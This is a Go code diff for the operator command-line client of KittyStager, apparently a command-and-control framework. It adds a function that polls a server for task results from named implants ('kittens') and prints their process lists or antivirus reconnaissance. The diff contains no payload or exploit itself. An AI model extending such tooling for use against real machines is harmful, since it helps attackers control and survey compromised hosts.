@@ -1,4 +1,4 @@
-package client
+package cli
 
 import (
 	"KittyStager/internal/config"
@@ -16,8 +16,9 @@ import (
 )
 
 var (
-	exit bool
-	host string
+	exit    bool
+	host    string
+	kittens map[string]*kitten.Kitten
 )
 
 func init() {
@@ -35,7 +36,7 @@ func getConfig() (*config.Config, error) {
 }
 
 func getKittens() (map[string]*kitten.Kitten, error) {
-	var kittens map[string]*kitten.Kitten
+	//var kittens map[string]*kitten.Kitten
 	kittens = make(map[string]*kitten.Kitten)
 	b, err := getRequest(fmt.Sprintf("%s/kittensList", host))
 	if err != nil {
@@ -88,6 +89,7 @@ func exitLogs() {
 }
 
 func createTask(task *task.Task, name string) error {
+	fmt.Println("[*] New job created for", name)
 	marshalledTask, err := task.MarshallTask()
 	if err != nil {
 		return err
@@ -143,4 +145,35 @@ func postRequest(content []byte, url string) ([]byte, error) {
 		return body, err
 	}
 	return body, nil
+}
+
+func checkForResponse(name string) error {
+	t := task.NewTask("", nil)
+	var b []byte
+	var err error
+	for {
+		b, err = getRequest(fmt.Sprintf("%s/result/%s", host, name))
+		if err != nil {
+			return err
+		}
+		if string(b) != "null" {
+			break
+		}
+		time.Sleep(1 * time.Second)
+	}
+	err = t.UnmarshallTask(b)
+	if err != nil {
+		return err
+	}
+	switch t.Tag {
+	case "ps":
+		pid := kittens[name].Recon.Pid
+		err = printPS(t, pid)
+		if err != nil {
+			return err
+		}
+	case "av":
+		printAV(t)
+	}
+	return nil
 }
